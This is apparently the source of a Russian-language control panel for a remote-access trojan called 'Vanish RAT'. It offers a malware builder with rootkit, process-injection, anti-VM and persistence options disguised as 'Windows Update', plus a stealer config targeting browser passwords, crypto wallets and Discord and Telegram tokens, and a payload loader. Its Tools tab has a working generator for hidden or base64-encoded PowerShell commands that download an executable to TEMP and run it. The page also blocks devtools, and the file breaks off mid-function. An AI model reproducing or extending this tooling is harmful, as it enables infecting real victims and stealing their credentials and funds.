const { $, $$, el, icon, toast, formatDate, protectDevtools } = UI;
const { loadDB, saveDB, generateId, generateKey, generateToken, auditPush } = VanishDB;

let state = {
  view: 'captcha',
  session: null,
  fp: null,
  captcha: null,
  tab: 'dashboard',
  adminTab: 'dashboard',
  toolTab: 'tg',
  bannerShown: false,
  builder: {
    domain: 'vanish.new.tg',
    rootkit: false,
    hiddenAttrs: true,
    processInject: true,
    folderHide: true,
    startup: true,
    antiVM: true,
    antiDebug: true,
    stringEncrypt: true,
    persistence: 'registry',
    injectTarget: 'explorer.exe',
    name: 'Windows Update'
  },
  stealer: {
    browsers: true,
    wallets: true,
    discord: true,
    telegram: true,
    files: false,
    screenshot: true,
    hidden: true,
    tags: 'passwords,cookies,tokens',
    webhook: ''
  },
  loader: {
    method: 'url',
    url: '',
    delay: 0,
    melt: true,
    elevate: false
  }
};

function logAudit(actor, action, meta) {
  const db = loadDB();
  auditPush(db, actor, action, meta);
  saveDB(db);
}

async function init() {
  protectDevtoolsEnhanced();
  const db = loadDB();
  document.title = db.settings.title || 'Vanish Rat';

  state.session = Auth.getSession();
  try {
    state.fp = await collectFingerprint();
  } catch (e) {
    state.fp = { hash: 'unknown', components: {} };
  }

  if (db.bans.some(b => b.fp === state.fp.hash && b.active)) {
    state.view = 'banned';
    logAudit('anon', 'banned_hit', { fp: state.fp.hash.slice(0, 12) });
    render();
    return;
  }

  const gate = (location.hash || '').replace(/^#\/?/, '');
  if (gate === db.settings.adminGate && state.session && Auth.isOperator(state.session)) {
    state.view = 'admin';
    logAudit(state.session.login, 'admin_enter', { gate: true });
  } else if (state.session) {
    state.view = 'panel';
  }

  render();
  if (window.lucide) lucide.createIcons();
}

function protectDevtoolsEnhanced() {
  document.addEventListener('contextmenu', e => {
    e.preventDefault();
    logAudit(state.session?.login || 'anon', 'devtools_contextmenu', {});
  });
  document.addEventListener('keydown', e => {
    const blocked = e.key === 'F12' ||
      (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes((e.key || '').toUpperCase())) ||
      (e.ctrlKey && (e.key || '').toUpperCase() === 'U');
    if (blocked) {
      e.preventDefault();
      e.stopPropagation();
      logAudit(state.session?.login || 'anon', 'devtools_attempt', { key: e.key });
      return false;
    }
  });
  let devOpen = false;
  setInterval(() => {
    const w = window.outerWidth - window.innerWidth > 120 || window.outerHeight - window.innerHeight > 120;
    if (w && !devOpen) {
      devOpen = true;
      logAudit(state.session?.login || 'anon', 'devtools_open_detect', {});
    } else if (!w) devOpen = false;
  }, 2000);
}

function render() {
  const app = $('#app');
  if (!app) return;
  app.innerHTML = '';
  const map = {
    captcha: viewCaptcha,
    auth: viewAuth,
    panel: viewPanel,
    admin: viewAdmin,
    banned: viewBanned,
    '404': view404
  };
  app.appendChild((map[state.view] || viewCaptcha)());
  maybeShowBanner();
  if (window.lucide) setTimeout(() => lucide.createIcons(), 40);
}

function maybeShowBanner() {
  if (state.bannerShown) return;
  if (state.view !== 'auth' && state.view !== 'panel' && state.view !== 'admin') return;
  const db = loadDB();
  if (!db.banner?.enabled || !db.banner.text) return;
  state.bannerShown = true;
  const overlay = el('div', { className: 'banner-overlay fade-in', id: 'bannerOverlay' });
  const mediaHtml = db.banner.media
    ? (db.banner.mediaType === 'video'
      ? `<video class="banner-media" src="${esc(db.banner.media)}" autoplay muted loop playsinline></video>`
      : `<img class="banner-media" src="${esc(db.banner.media)}" alt="">`)
    : '';
  overlay.innerHTML = `
    <div class="banner-card glass-strong neon-border">
      ${mediaHtml}
      <div class="p-5">
        <div class="text-sm leading-relaxed mb-4 whitespace-pre-wrap">${esc(db.banner.text)}</div>
        <button id="bannerClose" class="btn-primary w-full rounded-lg py-2.5 text-sm opacity-40 cursor-not-allowed" disabled>
          Закрыть (<span id="bannerTimer">${db.banner.dismissAfter || 5}</span>)
        </button>
      </div>
    </div>`;
  document.body.appendChild(overlay);
  let left = db.banner.dismissAfter || 5;
  const t = setInterval(() => {
    left--;
    const elT = $('#bannerTimer');
    if (elT) elT.textContent = left;
    if (left <= 0) {
      clearInterval(t);
      const btn = $('#bannerClose');
      if (btn) {
        btn.disabled = false;
        btn.classList.remove('opacity-40', 'cursor-not-allowed');
        btn.textContent = 'Закрыть';
        btn.onclick = () => overlay.remove();
      }
    }
  }, 1000);
}

function esc(s) {
  return String(s || '').replace(/[&<>"']/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
}

function viewCaptcha() {
  const wrap = el('div', { className: 'min-h-screen flex items-center justify-center p-4' });
  const card = el('div', { className: 'glass-strong rounded-2xl p-8 w-full max-w-md neon-border fade-in' });
  card.innerHTML = `
    <div class="text-center mb-6">
      <div class="font-display text-2xl tracking-widest glow-text text-accent mb-1">VANISH</div>
      <div class="text-xs text-muted tracking-[0.3em] uppercase">Access Gate</div>
    </div>
    <p class="text-sm text-muted text-center mb-4">Введите код с изображения</p>
    <div class="flex justify-center mb-3">
      <canvas id="captchaCanvas" width="240" height="70" class="captcha-canvas"></canvas>
    </div>
    <div class="flex gap-2 mb-4">
      <input id="captchaInput" type="text" maxlength="6" placeholder="XXXXXX" class="input-field flex-1 rounded-lg px-4 py-2.5 text-center font-mono tracking-widest uppercase text-sm" autocomplete="off">
      <button id="captchaRefresh" class="btn-ghost rounded-lg px-3 flex items-center justify-center" type="button">
        <i data-lucide="refresh-cw" width="18" height="18"></i>
      </button>
    </div>
    <button id="captchaSubmit" class="btn-primary w-full rounded-lg py-2.5 font-medium text-sm" type="button">Продолжить</button>
    <p id="captchaError" class="text-danger text-xs text-center mt-3 hidden">Неверный код</p>
  `;
  wrap.appendChild(card);
  setTimeout(() => {
    state.captcha = new Captcha('captchaCanvas', 'captchaInput');
    state.captcha.generate();
    $('#captchaCanvas').onclick = () => state.captcha.refresh();
    $('#captchaRefresh').onclick = () => state.captcha.refresh();
    $('#captchaSubmit').onclick = () => {
      if (state.captcha.validate($('#captchaInput').value)) {
        logAudit('anon', 'captcha_ok', {});
        state.view = 'auth';
        render();
      } else {
        logAudit('anon', 'captcha_fail', {});
        state.captcha.refresh();
        const err = $('#captchaError');
        err.classList.remove('hidden');
        setTimeout(() => err.classList.add('hidden'), 2200);
      }
    };
    $('#captchaInput').onkeydown = e => { if (e.key === 'Enter') $('#captchaSubmit').click(); };
  }, 50);
  return wrap;
}

function viewAuth() {
  const wrap = el('div', { className: 'min-h-screen flex items-center justify-center p-4' });
  const card = el('div', { className: 'glass-strong rounded-2xl p-8 w-full max-w-md neon-border fade-in' });
  card.innerHTML = `
    <div class="text-center mb-8">
      <div class="font-display text-3xl tracking-widest glow-text text-accent mb-1">VANISH RAT</div>
      <div class="text-xs text-muted tracking-[0.25em] uppercase">Control Panel</div>
    </div>
    <div class="flex gap-2 mb-6">
      <button data-mode="login" type="button" class="auth-tab flex-1 py-2 rounded-lg text-sm font-medium tab-active border border-transparent">Вход</button>
      <button data-mode="register" type="button" class="auth-tab flex-1 py-2 rounded-lg text-sm font-medium border border-transparent text-muted">Регистрация</button>
    </div>
    <div class="space-y-4">
      <div>
        <label class="text-xs text-muted mb-1.5 block">Логин</label>
        <input id="authLogin" type="text" class="input-field w-full rounded-lg px-4 py-2.5 text-sm" placeholder="username" autocomplete="username">
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Ключ</label>
        <input id="authKey" type="text" class="input-field w-full rounded-lg px-4 py-2.5 text-sm font-mono tracking-wider" placeholder="XXXX-XXXX-XXXX-XXXX" autocomplete="off">
      </div>
      <button id="authSubmit" type="button" class="btn-primary w-full rounded-lg py-2.5 font-medium text-sm mt-2">Войти</button>
      <p id="authError" class="text-danger text-xs text-center hidden"></p>
    </div>
  `;
  wrap.appendChild(card);
  let mode = 'login';
  setTimeout(() => {
    $$('.auth-tab').forEach(btn => {
      btn.onclick = () => {
        mode = btn.dataset.mode;
        $$('.auth-tab').forEach(b => {
          b.classList.toggle('tab-active', b.dataset.mode === mode);
          b.classList.toggle('text-muted', b.dataset.mode !== mode);
        });
        $('#authSubmit').textContent = mode === 'login' ? 'Войти' : 'Зарегистрироваться';
      };
    });
    $('#authSubmit').onclick = async () => {
      const login = $('#authLogin').value.trim();
      const key = $('#authKey').value.trim();
      const errEl = $('#authError');
      errEl.classList.add('hidden');
      if (!login || !key) {
        errEl.textContent = 'Заполните все поля';
        errEl.classList.remove('hidden');
        return;
      }
      const res = mode === 'login'
        ? await Auth.login(login, key, state.fp.hash)
        : Auth.register(login, key, state.fp.hash);
      if (!res.ok) {
        logAudit(login, mode + '_fail', { error: res.error });
        const msgs = {
          invalid_credentials: 'Неверный логин или ключ',
          invalid_key: 'Ключ недействителен',
          login_taken: 'Логин уже занят',
          key_expired: 'Срок действия ключа истёк',
          banned: 'Аккаунт заблокирован',
          access_denied: 'Доступ запрещён'
        };
        errEl.textContent = msgs[res.error] || 'Ошибка';
        errEl.classList.remove('hidden');
        return;
      }
      logAudit(login, mode + '_ok', {});
      state.session = res.session;
      state.view = 'panel';
      render();
    };
  }, 50);
  return wrap;
}

function shellLayout(sidebarHtml, mainNode, isAdmin) {
  const shell = el('div', { className: 'min-h-screen flex shell-flex' });
  const sidebar = el('aside', { className: 'sidebar glass border-r border-border flex flex-col' });
  sidebar.innerHTML = sidebarHtml;
  const main = el('main', { className: 'main-area p-4 md:p-6 p-mobile' });
  main.appendChild(mainNode);
  shell.appendChild(sidebar);
  shell.appendChild(main);
  setTimeout(() => {
    $$('.nav-item').forEach(btn => {
      btn.onclick = () => {
        if (isAdmin) state.adminTab = btn.dataset.tab;
        else state.tab = btn.dataset.tab;
        render();
      };
    });
    const lo = $('#logoutBtn');
    if (lo) lo.onclick = () => {
      logAudit(state.session?.login || '?', 'logout', {});
      Auth.destroySession();
      state.session = null;
      state.view = 'auth';
      state.bannerShown = false;
      render();
    };
  }, 40);
  return shell;
}

function viewPanel() {
  const db = loadDB();
  const user = db.users.find(u => u.id === state.session.userId) || {};
  const isTrial = user.roleId === 'r_trial';
  const clients = db.clients.filter(c => c.ownerId === user.id || !c.ownerId);
  const online = clients.filter(c => c.status === 'online').length;

  const nav = `
    <div class="p-5 border-b border-border">
      <div class="font-display text-lg tracking-wider text-accent glow-text">VANISH</div>
      <div class="text-[10px] text-muted tracking-widest mt-0.5">RAT PANEL</div>
    </div>
    <nav class="flex-1 p-3 space-y-1 nav-row">
      ${navBtn('dashboard', 'layout-dashboard', 'Дашборд', state.tab)}
      ${navBtn('clients', 'monitor', 'Клиенты', state.tab)}
      ${navBtn('builder', 'hammer', 'Билдер', state.tab)}
      ${navBtn('stealer', 'fingerprint', 'Стиллер', state.tab)}
      ${navBtn('loader', 'download', 'Лоадер', state.tab)}
      ${navBtn('tools', 'wrench', 'Тулки', state.tab)}
      ${navBtn('logs', 'scroll-text', 'Логи', state.tab)}
      ${navBtn('settings', 'settings', 'Настройки', state.tab)}
    </nav>
    <div class="p-4 border-t border-border">
      <div class="text-xs text-muted mb-1">${esc(user.login)}</div>
      <div class="text-[10px] text-accent/70">${isTrial ? 'TRIAL' : (user.sub?.type === 'lifetime' ? 'LIFETIME' : 'ACTIVE')}</div>
      <button id="logoutBtn" type="button" class="mt-3 text-xs text-muted hover:text-danger transition">Выйти</button>
    </div>`;

  let content;
  if (state.tab === 'dashboard') content = panelDashboard(clients, online, user);
  else if (state.tab === 'clients') content = panelClients(clients);
  else if (state.tab === 'builder') content = panelBuilder(isTrial);
  else if (state.tab === 'stealer') content = panelStealer(isTrial);
  else if (state.tab === 'loader') content = panelLoader(isTrial);
  else if (state.tab === 'tools') content = panelTools();
  else if (state.tab === 'logs') content = panelLogs(db.logs.filter(l => l.ownerId === user.id));
  else content = panelSettings(user);

  return shellLayout(nav, content, false);
}

function navBtn(id, ico, label, current) {
  const on = current === id;
  return `<button data-tab="${id}" type="button" class="nav-item w-full flex items-center gap-3 px-3 py-2.5 rounded-lg text-sm transition ${on ? 'tab-active' : 'text-muted hover:text-white'}">
    <i data-lucide="${ico}" width="16" height="16"></i> <span>${label}</span>
  </button>`;
}

function panelDashboard(clients, online, user) {
  const box = el('div', { className: 'fade-in' });
  box.innerHTML = `
    <h1 class="font-display text-xl tracking-wide mb-6">Дашборд</h1>
    <div class="grid grid-cols-2 md:grid-cols-4 gap-3 grid-stats mb-6">
      <div class="stat-card"><div class="num">${online}</div><div class="text-xs text-muted mt-1">Online</div></div>
      <div class="stat-card"><div class="num">${clients.length}</div><div class="text-xs text-muted mt-1">Всего клиентов</div></div>
      <div class="stat-card"><div class="num">${user.sub?.type === 'lifetime' ? '∞' : '1'}</div><div class="text-xs text-muted mt-1">Подписка</div></div>
      <div class="stat-card"><div class="num">${(loadDB().logs.filter(l => l.ownerId === user.id) || []).length}</div><div class="text-xs text-muted mt-1">Логов</div></div>
    </div>
    <div class="glass rounded-xl p-5">
      <div class="text-xs text-muted uppercase tracking-wider mb-3">Последние клиенты</div>
      ${clients.slice(0, 6).map(c => `
        <div class="flex items-center gap-3 py-2.5 border-b border-border last:border-0">
          <div class="w-8 h-8 rounded-lg bg-accent/10 flex items-center justify-center text-accent">
            <i data-lucide="monitor" width="14" height="14"></i>
          </div>
          <div class="flex-1 min-w-0">
            <div class="text-sm truncate">${esc(c.name)}</div>
            <div class="text-[11px] text-muted truncate">${esc(c.os)} · ${esc(c.av)}</div>
          </div>
          <span class="text-xs ${c.status === 'online' ? 'status-online' : 'status-offline'}">${c.status || 'off'}</span>
        </div>`).join('') || '<div class="text-sm text-muted py-4 text-center">Нет клиентов</div>'}
    </div>`;
  return box;
}

function panelClients(clients) {
  const box = el('div', { className: 'fade-in' });
  box.innerHTML = `
    <div class="flex items-center justify-between mb-6">
      <h1 class="font-display text-xl tracking-wide">Клиенты</h1>
      <div class="text-xs text-muted">${clients.length}</div>
    </div>`;
  if (!clients.length) {
    box.appendChild(el('div', { className: 'glass rounded-xl p-12 text-center text-muted text-sm' }, ['Нет подключённых клиентов']));
  } else {
    const grid = el('div', { className: 'grid gap-3 sm:grid-cols-2' });
    clients.forEach(c => {
      const card = el('div', { className: 'glass rounded-xl p-4 card-hover border border-border flex items-center gap-4' });
      card.innerHTML = `
        <div class="w-10 h-10 rounded-lg bg-accent/10 flex items-center justify-center text-accent shrink-0">
          <i data-lucide="monitor" width="20" height="20"></i>
        </div>
        <div class="flex-1 min-w-0">
          <div class="font-medium text-sm truncate">${esc(c.name)}</div>
          <div class="text-xs text-muted truncate">${esc(c.device)} · ${esc(c.os)} · ${esc(c.av)}</div>
        </div>
        <div class="text-right shrink-0">
          <div class="text-xs ${c.status === 'online' ? 'status-online' : 'status-offline'}">${c.status || 'offline'}</div>
          <div class="text-[10px] text-muted mt-0.5 max-w-[100px] truncate">${esc(c.activeWindow)}</div>
        </div>`;
      grid.appendChild(card);
    });
    box.appendChild(grid);
  }
  return box;
}

function panelBuilder(isTrial) {
  const b = state.builder;
  const box = el('div', { className: 'fade-in max-w-3xl' });
  box.innerHTML = `
    <div class="flex items-center justify-between mb-6 flex-wrap gap-2">
      <h1 class="font-display text-xl tracking-wide">Билдер</h1>
      ${isTrial ? '<span class="text-xs text-warn border border-warn/30 px-2 py-1 rounded">TRIAL</span>' : ''}
    </div>
    <div class="glass rounded-xl p-5 md:p-6 space-y-5">
      <div>
        <label class="text-xs text-muted mb-1.5 block">Домен C2</label>
        <input id="bldDomain" type="text" value="${esc(b.domain)}" class="input-field w-full rounded-lg px-4 py-2.5 text-sm font-mono" ${isTrial ? 'disabled' : ''}>
      </div>
      <div class="grid builder-grid grid-cols-2 gap-4">
        <div>
          <label class="text-xs text-muted mb-1.5 block">Имя процесса</label>
          <input id="bldName" type="text" value="${esc(b.name)}" class="input-field w-full rounded-lg px-4 py-2.5 text-sm" ${isTrial ? 'disabled' : ''}>
        </div>
        <div>
          <label class="text-xs text-muted mb-1.5 block">Цель инжекта</label>
          <input id="bldInject" type="text" value="${esc(b.injectTarget)}" class="input-field w-full rounded-lg px-4 py-2.5 text-sm font-mono" ${isTrial ? 'disabled' : ''}>
        </div>
      </div>
      <div class="grid builder-grid grid-cols-2 gap-3">
        ${tog('bldRootkit', 'Rootkit', b.rootkit, isTrial)}
        ${tog('bldHidden', 'Скрытые атрибуты', b.hiddenAttrs, isTrial)}
        ${tog('bldInjectEn', 'Process Injection', b.processInject, isTrial)}
        ${tog('bldFolder', 'Скрытие папок', b.folderHide, isTrial)}
        ${tog('bldStartup', 'Автозагрузка', b.startup, isTrial)}
        ${tog('bldAntiVM', 'Anti-VM', b.antiVM, isTrial)}
        ${tog('bldAntiDbg', 'Anti-Debug', b.antiDebug, isTrial)}
        ${tog('bldEncrypt', 'String Encryption', b.stringEncrypt, isTrial)}
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Persistence</label>
        <select id="bldPersist" class="input-field w-full rounded-lg px-4 py-2.5 text-sm" ${isTrial ? 'disabled' : ''}>
          <option value="registry">Registry</option>
          <option value="task">Scheduled Task</option>
          <option value="service">Service</option>
          <option value="startup">Startup Folder</option>
        </select>
      </div>
      <button id="bldBuild" type="button" class="btn-primary w-full rounded-lg py-3 font-medium text-sm" ${isTrial ? 'disabled' : ''}>Собрать билд</button>
      <div id="bldProgress" class="hidden">
        <div class="h-1.5 bg-border rounded-full overflow-hidden"><div id="bldBar" class="h-full bg-accent transition-all" style="width:0%"></div></div>
        <p id="bldStatus" class="text-xs text-muted mt-2 text-center"></p>
      </div>
    </div>`;
  setTimeout(() => {
    if (isTrial) return;
    $('#bldPersist').value = b.persistence;
    $('#bldBuild').onclick = () => {
      logAudit(state.session.login, 'builder_run', { domain: $('#bldDomain').value });
      const prog = $('#bldProgress'), bar = $('#bldBar'), status = $('#bldStatus');
      prog.classList.remove('hidden');
      let p = 0;
      const steps = ['Stub...', 'Encrypt...', 'Persistence...', 'Anti-analysis...', 'Pack...', 'Done'];
      const iv = setInterval(() => {
        p += 18;
        if (p >= 100) {
          p = 100; clearInterval(iv);
          status.textContent = 'Готово (визуальный режим)';
          toast('Билд завершён', 'success');
        } else status.textContent = steps[Math.min(Math.floor(p / 20), 5)];
        bar.style.width = p + '%';
      }, 320);
    };
  }, 40);
  return box;
}

function tog(id, label, checked, disabled) {
  return `<label class="flex items-center gap-3 glass rounded-lg px-3 py-2.5 cursor-pointer border border-border ${disabled ? 'opacity-50' : 'hover:border-accent/40'}">
    <input type="checkbox" id="${id}" ${checked ? 'checked' : ''} ${disabled ? 'disabled' : ''} class="accent-accent">
    <span class="text-sm">${label}</span>
  </label>`;
}

function panelStealer(isTrial) {
  const s = state.stealer;
  const box = el('div', { className: 'fade-in max-w-2xl' });
  box.innerHTML = `
    <h1 class="font-display text-xl tracking-wide mb-6">Стиллер</h1>
    <div class="glass rounded-xl p-5 md:p-6 space-y-4">
      <div>
        <label class="text-xs text-muted mb-1.5 block">Теги сбора (через запятую)</label>
        <input id="stTags" type="text" value="${esc(s.tags)}" class="input-field w-full rounded-lg px-4 py-2.5 text-sm font-mono" ${isTrial ? 'disabled' : ''}>
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Webhook / endpoint</label>
        <input id="stWebhook" type="text" value="${esc(s.webhook)}" class="input-field w-full rounded-lg px-4 py-2.5 text-sm font-mono" placeholder="https://..." ${isTrial ? 'disabled' : ''}>
      </div>
      <div class="grid builder-grid grid-cols-2 gap-3">
        ${tog('stBrowsers', 'Браузеры', s.browsers, isTrial)}
        ${tog('stWallets', 'Кошельки', s.wallets, isTrial)}
        ${tog('stDiscord', 'Discord', s.discord, isTrial)}
        ${tog('stTelegram', 'Telegram', s.telegram, isTrial)}
        ${tog('stFiles', 'Файлы', s.files, isTrial)}
        ${tog('stScreen', 'Скриншот', s.screenshot, isTrial)}
        ${tog('stHidden', 'Скрытый режим', s.hidden, isTrial)}
      </div>
      <button id="stSave" type="button" class="btn-primary w-full rounded-lg py-2.5 text-sm" ${isTrial ? 'disabled' : ''}>Сохранить конфиг</button>
    </div>`;
  setTimeout(() => {
    if (isTrial) return;
    $('#stSave').onclick = () => {
      state.stealer.tags = $('#stTags').value;
      state.stealer.webhook = $('#stWebhook').value;
      state.stealer.browsers = $('#stBrowsers').checked;
      state.stealer.wallets = $('#stWallets').checked;
      state.stealer.discord = $('#stDiscord').checked;
      state.stealer.telegram = $('#stTelegram').checked;
      state.stealer.files = $('#stFiles').checked;
      state.stealer.screenshot = $('#stScreen').checked;
      state.stealer.hidden = $('#stHidden').checked;
      logAudit(state.session.login, 'stealer_save', { tags: state.stealer.tags });
      toast('Конфиг стиллера сохранён', 'success');
    };
  }, 40);
  return box;
}

function panelLoader(isTrial) {
  const l = state.loader;
  const box = el('div', { className: 'fade-in max-w-2xl' });
  box.innerHTML = `
    <h1 class="font-display text-xl tracking-wide mb-6">Лоадер</h1>
    <div class="glass rounded-xl p-5 md:p-6 space-y-4">
      <div>
        <label class="text-xs text-muted mb-1.5 block">Метод</label>
        <select id="ldMethod" class="input-field w-full rounded-lg px-4 py-2.5 text-sm" ${isTrial ? 'disabled' : ''}>
          <option value="url">URL download</option>
          <option value="embed">Embedded</option>
          <option value="stage">Staged</option>
        </select>
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Payload URL</label>
        <input id="ldUrl" type="text" value="${esc(l.url)}" class="input-field w-full rounded-lg px-4 py-2.5 text-sm font-mono" ${isTrial ? 'disabled' : ''}>
      </div>
      <div>
        <label class="text-xs text-muted mb-1.5 block">Delay (sec)</label>
        <input id="ldDelay" type="number" value="${l.delay}" min="0" class="input-field w-full rounded-lg px-4 py-2.5 text-sm" ${isTrial ? 'disabled' : ''}>
      </div>
      <div class="grid builder-grid grid-cols-2 gap-3">
        ${tog('ldMelt', 'Self-delete / melt', l.melt, isTrial)}
        ${tog('ldElevate', 'UAC elevate', l.elevate, isTrial)}
      </div>
      <button id="ldSave" type="button" class="btn-primary w-full rounded-lg py-2.5 text-sm" ${isTrial ? 'disabled' : ''}>Сохранить</button>
    </div>`;
  setTimeout(() => {
    if (isTrial) return;
    $('#ldMethod').value = l.method;
    $('#ldSave').onclick = () => {
      state.loader.method = $('#ldMethod').value;
      state.loader.url = $('#ldUrl').value;
      state.loader.delay = parseInt($('#ldDelay').value, 10) || 0;
      state.loader.melt = $('#ldMelt').checked;
      state.loader.elevate = $('#ldElevate').checked;
      logAudit(state.session.login, 'loader_save', {});
      toast('Лоадер сохранён', 'success');
    };
  }, 40);
  return box;
}

function panelTools() {
  const box = el('div', { className: 'fade-in' });
  box.innerHTML = `
    <h1 class="font-display text-xl tracking-wide mb-4">Тулки</h1>
    <div class="tool-tabs" id="toolTabs">
      <button type="button" class="tool-tab ${state.toolTab === 'tg' ? 'on' : ''}" data-tt="tg">TG Forward</button>
      <button type="button" class="tool-tab ${state.toolTab === 'ps' ? 'on' : ''}" data-tt="ps">PowerShell</button>
      <button type="button" class="tool-tab ${state.toolTab === 'codec' ? 'on' : ''}" data-tt="codec">Encode</button>
      <button type="button" class="tool-tab ${state.toolTab === 'keys' ? 'on' : ''}" data-tt="keys">Keys</button>
      <button type="button" class="tool-tab ${state.toolTab === 'psdec' ? 'on' : ''}" data-tt="psdec">PS Decode</button>
    </div>
    <div id="toolBody" class="glass rounded-xl p-5"></div>`;
  setTimeout(() => {
    $$('#toolTabs .tool-tab').forEach(b => {
      b.onclick = () => {
        state.toolTab = b.dataset.tt;
        renderToolBody();
        $$('#toolTabs .tool-tab').forEach(x => x.classList.toggle('on', x.dataset.tt === state.toolTab));
      };
    });
    renderToolBody();
  }, 30);
  return box;
}

function renderToolBody() {
  const body = $('#toolBody');
  if (!body) return;
  if (state.toolTab === 'tg') {
    body.innerHTML = `
      <div class="space-y-3">
        <div><label class="text-xs text-muted mb-1 block">Bot token</label>
        <input id="tgToken" type="password" class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono" placeholder="123456:AA..."></div>
        <div class="grid builder-grid grid-cols-2 gap-3">
          <div><label class="text-xs text-muted mb-1 block">From chat</label>
          <input id="tgFrom" class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono"></div>
          <div><label class="text-xs text-muted mb-1 block">To chat</label>
          <input id="tgTo" class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono"></div>
        </div>
        <div class="grid grid-cols-3 gap-2">
          <div><label class="text-xs text-muted mb-1 block">Msg from</label>
          <input id="tgMf" type="number" value="1" class="input-field w-full rounded-lg px-3 py-2 text-sm"></div>
          <div><label class="text-xs text-muted mb-1 block">Msg to</label>
          <input id="tgMt" type="number" value="50" class="input-field w-full rounded-lg px-3 py-2 text-sm"></div>
          <div><label class="text-xs text-muted mb-1 block">Delay ms</label>
          <input id="tgDelay" type="number" value="350" class="input-field w-full rounded-lg px-3 py-2 text-sm"></div>
        </div>
        <button id="tgStart" type="button" class="btn-primary w-full rounded-lg py-2.5 text-sm">Start forward</button>
        <div id="tgLog" class="text-xs font-mono text-muted max-h-40 overflow-auto mt-2"></div>
      </div>`;
    $('#tgStart').onclick = async () => {
      const token = $('#tgToken').value.trim();
      const from = $('#tgFrom').value.trim();
      const to = $('#tgTo').value.trim();
      const a = parseInt($('#tgMf').value, 10);
      const b = parseInt($('#tgMt').value, 10);
      const delay = parseInt($('#tgDelay').value, 10) || 350;
      const log = $('#tgLog');
      log.innerHTML = '';
      if (!token || !from || !to) { toast('Заполни token и chat id', 'error'); return; }
      logAudit(state.session?.login, 'tool_tg_forward', {});
      for (let id = a; id <= b; id++) {
        try {
          const r = await fetch(`https://api.telegram.org/bot${token}/forwardMessage?chat_id=${encodeURIComponent(to)}&from_chat_id=${encodeURIComponent(from)}&message_id=${id}`);
          const j = await r.json();
          log.innerHTML += `<div class="${j.ok ? 'text-success' : 'text-danger'}">#${id} ${j.ok ? 'ok' : (j.description || 'fail')}</div>`;
        } catch (e) {
          log.innerHTML += `<div class="text-danger">#${id} network</div>`;
        }
        log.scrollTop = log.scrollHeight;
        await new Promise(r => setTimeout(r, delay));
      }
      toast('Forward done', 'success');
    };
  } else if (state.toolTab === 'ps') {
    body.innerHTML = `
      <div class="space-y-3">
        <div><label class="text-xs text-muted mb-1 block">Download URL</label>
        <input id="psUrl" class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono" placeholder="https://..."></div>
        <label class="flex items-center gap-2 text-sm"><input type="checkbox" id="psB64" class="accent-accent"> Base64 -enc</label>
        <button id="psBuild" type="button" class="btn-primary w-full rounded-lg py-2.5 text-sm">Build</button>
        <pre id="psOut" class="text-xs font-mono bg-void/80 p-3 rounded-lg border border-border overflow-auto max-h-48 whitespace-pre-wrap"></pre>
        <button id="psCopy" type="button" class="btn-ghost w-full rounded-lg py-2 text-xs">Copy</button>
      </div>`;
    $('#psBuild').onclick = () => {
      const url = $('#psUrl').value.trim();
      if (!url) return;
      const cmd = `$u='${url.replace(/'/g, "''")}';$o=$env:TEMP+'\\p.exe';(New-Object Net.WebClient).DownloadFile($u,$o);Start-Process $o`;
      let out = cmd;
      if ($('#psB64').checked) {
        const bytes = new TextEncoder().encode(cmd);
        const utf16 = new Uint8Array(bytes.length * 2);
        for (let i = 0; i < bytes.length; i++) { utf16[i * 2] = bytes[i]; }
        let bin = '';
        utf16.forEach(b => bin += String.fromCharCode(b));
        out = 'powershell -enc ' + btoa(bin);
      } else {
        out = 'powershell -nop -w hidden -c "' + cmd.replace(/"/g, '`"') + '"';
      }
      $('#psOut').textContent = out;
      logAudit(state.session?.login, 'tool_ps_build', {});
    };
    $('#psCopy').onclick = () => {
      navigator.clipboard.writeText($('#psOut').textContent || '');
      toast('Copied', 'success');
    };
  } else if (state.toolTab === 'codec') {
    body.innerHTML = `
      <div class="space-y-3">
        <textarea id="codecIn" class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono min-h-[100px]" placeholder="input"></textarea>
        <select id="codecMode" class="input-field w-full rounded-lg px-3 py-2 text-sm">
          <option value="b64e">Base64 encode</option>
          <option value="b64d">Base64 decode</option>
          <option value="urlenc">URL encode</option>
          <option value="urldec">URL decode</option>
          <option value="hexe">Hex encode</option>
          <option value="hexd">Hex decode</option>
        </select>
        <button id="codecRun" type="button" class="btn-primary w-full rounded-lg py-2.5 text-sm">Run</button>
        <textarea id="codecOut" readonly class="input-field w-full rounded-lg px-3 py-2 text-sm font-mono min-h-[100px]"></textarea>
      </div>`;
    $('#codecRun').onclick = () => {
      const inp = $('#codecIn').value;
      const mode = $('#codecMode').value;
      let out = '';
      try {
        if (mode === 'b64e') out = btoa(unescape(encodeURIComponent(inp)));
        else if (mode === 'b64d') out = decodeURIComponent(escape(atob(inp.replace(/\s+/g, ''))));
        else if (mode === 'urlenc') out = encodeURIComponent(inp);
        else if (mode === 'urldec') out = decodeURIComponent(inp);
        else if (mode === 'hexe') out = Array.from(new TextEncoder().encode(inp)).map(b => b.toString(16).padStart(2, '0')).join('');
        else if (mode === 'hexd') {
          const bytes = new Uint8Array(inp.replace(/\s/g, '').match(/.{1,2}/g).map(h => parseInt(h, 16)));
          out = new TextDecoder().decode(bytes);
        }
      } catch (e) { out = 'error: ' + e.message; }
      $('#codecOut').value = out;
    };
  } else if (state.toolTab === 'keys') {
    body.innerHTML = `
      <div class="space-y-3">
        <div class="grid grid-cols-2 gap-3">
          <div><label class="text-xs text-muted mb-1 block">Length</label>
          <input id="keyLen" type="number" value="32" min="8" max="256" class="input-field w-full rounded-lg px-3 py-2 text-sm"></div>
          <div><label class="text-xs text-muted mb-1 block">Alphabet</label>
          <select id="keyAlpha" class="input-field w-full rounded-lg px-3 py-2 text-sm">
            <option value="hex">Hex</option>
            <option value="alnum">Alphanumeric</option>
            <option value="uuid">UUID v4</option>
          </select></div>
        </div>
        <button id="keyGen" type="button" class="btn-primary w-full rounded-lg py-2.5 text-sm">Generate</button>
